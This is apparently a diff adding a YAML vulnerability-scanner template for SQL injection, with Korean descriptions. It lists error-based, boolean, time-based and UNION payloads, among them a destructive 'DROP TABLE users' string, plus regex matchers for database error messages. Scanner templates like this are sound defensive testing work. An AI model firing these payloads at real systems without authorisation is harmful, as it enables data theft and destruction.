@@ -1,0 +1,93 @@
+id: sqli-basic
+info:
+  name: "SQL Injection"
+  severity: critical
+  description: >
+    SQL 쿼리에 사용자 입력이 비위생화되어 포함될 때 발생하는 취약점.
+    에러 메시지 반사, Boolean-based, Time-based 방식으로 탐지.
+  references:
+    - https://portswigger.net/web-security/sql-injection
+  tags: [sqli, injection, database]
+
+definition:
+  method: [GET, POST]
+  position: [query, body, form_field, cookie, header]
+
+payload_groups:
+  - group: error_based
+    engine: "Error-based SQLi"
+    payloads:
+      - "'"
+      - "\""
+      - "' OR '1'='1"
+      - "' OR '1'='1' --"
+      - "'; DROP TABLE users; --"
+      - "1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --"
+
+  - group: boolean_based
+    engine: "Boolean-based Blind SQLi"
+    payloads:
+      - "' AND 1=1 --"
+      - "' AND 1=2 --"
+      - "1 AND 1=1"
+      - "1 AND 1=2"
+
+  - group: time_based
+    engine: "Time-based Blind SQLi"
+    payloads:
+      - "'; WAITFOR DELAY '0:0:5' --"     # MSSQL
+      - "' AND SLEEP(5) --"               # MySQL
+      - "'; SELECT pg_sleep(5) --"        # PostgreSQL
+      - "' AND 1=1 AND SLEEP(5) --"
+
+  - group: union_based
+    engine: "UNION-based SQLi"
+    payloads:
+      - "' UNION SELECT NULL --"
+      - "' UNION SELECT NULL,NULL --"
+      - "' UNION SELECT NULL,NULL,NULL --"
+
+matchers_condition: or
+
+matchers:
+  - type: regex
+    name: mysql_error
+    description: "MySQL 에러 메시지 반사"
+    regex:
+      - "you have an error in your sql syntax"
+      - "warning: mysql"
+      - "mysql_fetch"
+      - "mysql_num_rows"
+
+  - type: regex
+    name: mssql_error
+    description: "MSSQL 에러 메시지 반사"
+    regex:
+      - "microsoft ole db provider for sql server"
+      - "unclosed quotation mark"
+      - "syntax error converting"
+
+  - type: regex
+    name: oracle_error
+    description: "Oracle 에러 메시지 반사"
+    regex:
+      - "ora-[0-9]{5}"
+      - "oracle error"
+      - "oracle.*driver"
+
+  - type: regex
+    name: postgresql_error
+    description: "PostgreSQL 에러 메시지 반사"
+    regex:
+      - "pg_query\\(\\)"
+      - "postgresql.*error"
+      - "pg_exec\\(\\)"
+
+  - type: regex
+    name: generic_sql_error
+    description: "일반 SQL 에러 패턴"
+    regex:
+      - "sql syntax.*mysql"
+      - "sqlite_.*error"
+      - "jdbc.*exception"
+      - "sqlexception"
